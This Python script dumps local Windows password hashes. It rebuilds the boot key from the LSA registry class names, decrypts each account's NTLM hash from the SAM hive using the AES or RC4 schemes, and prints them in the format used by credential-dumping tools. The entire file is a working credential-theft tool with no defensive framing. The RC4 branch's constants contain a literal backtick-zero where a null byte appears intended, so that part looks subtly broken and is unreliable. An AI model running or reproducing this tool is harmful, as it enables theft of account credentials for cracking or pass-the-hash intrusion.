import winreg
import struct
from Crypto.Cipher import AES, DES, ARC4
from Crypto.Hash import MD5
import ctypes
from ctypes import wintypes

def str_to_key(s):
    out = bytearray()
    for i in range(49,-1,-7):
        k = (int.from_bytes(s, "big") >> i) & 0x7F
        out.append((k << 1) | (1 ^ k.bit_count() & 1))
    return bytes(out)

class_name = ""

for key in ["JD", "Skew1", "GBG", "Data"]:
    h = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Lsa\\"+key)
    buf = ctypes.create_unicode_buffer(1024)
    if not ctypes.windll.advapi32.RegQueryInfoKeyW(h.handle, buf, ctypes.byref(wintypes.DWORD(1024)), *[None]*9):
        class_name += buf.value
bootkey = bytes([bytes.fromhex(class_name)[i] for i in [8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7]])

sam = r"SAM\SAM\Domains\Account"

with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, sam) as h:
    f, _ = winreg.QueryValueEx(h, "F")

with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, sam + r"\Users") as user:
    for i in range(winreg.QueryInfoKey(user)[0]):
        sub_name = winreg.EnumKey(user, i)
        if len(sub_name) != 8:
            continue
        
        with winreg.OpenKey(user, sub_name) as user_key:
            v, _    = winreg.QueryValueEx(user_key, "V")
            rid     = int(sub_name, 16)
            rid_enc = struct.pack("<I", rid)
            
            user_start  = struct.unpack("<I", v[0x0C:0x10])[0] + 0xCC
            user_offset = struct.unpack("<I", v[0x10:0x14])[0]
            username    = v[user_start:user_start+user_offset].decode('utf-16le')

            revision    = v[0xAC]
            ntlm_offset = struct.unpack("<I", v[0xA8:0xAC])[0] + 0xCC
            
            if revision == 0x38: # AES
                cipher     = AES.new(bootkey, AES.MODE_CBC, iv=f[0x78:0x88])
                syskey     = cipher.decrypt(f[0x88:0x98])

                cipher     = AES.new(syskey,  AES.MODE_CBC, iv=v[ntlm_offset+8:ntlm_offset+24])
                dec_ntlm   = cipher.decrypt(v[ntlm_offset+24:ntlm_offset+40])
            elif revision == 0x14: # RC4
                md = MD5.new()
                md.update(f[0x70:0x80] + b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0" + bootkey + b"0123456789012345678901234567890123456789`0")
                syskey = ARC4.new(md.digest()).decrypt(f[0x80:0x90])

                md = MD5.new()
                md.update(syskey + rid_enc + b"NTPASSWORD`0")
                dec_ntlm = ARC4.new(md.digest()).decrypt(v[ntlm_offset+4:ntlm_offset+20])
            else:
                print(f"{username}:{rid}:31d6cfe0d16ae931b73c59d7e0c089c0") # empty
                continue
            
            k1    = str_to_key(rid_enc[:4]  + rid_enc[:3])
            k2    = str_to_key(rid_enc[3:4] + rid_enc[:4] + rid_enc[:2])
            out1  = DES.new(k1, DES.MODE_ECB).decrypt(dec_ntlm[:8])
            out2  = DES.new(k2, DES.MODE_ECB).decrypt(dec_ntlm[8:])
            # Probably won't extract LM hash explicitly, LM hash is assumed to be empty for >Vista.
            print(f"{username}:{rid}:aad3b435b51404eeaad3b435b51404ee:{(out1+out2).hex()}:::")
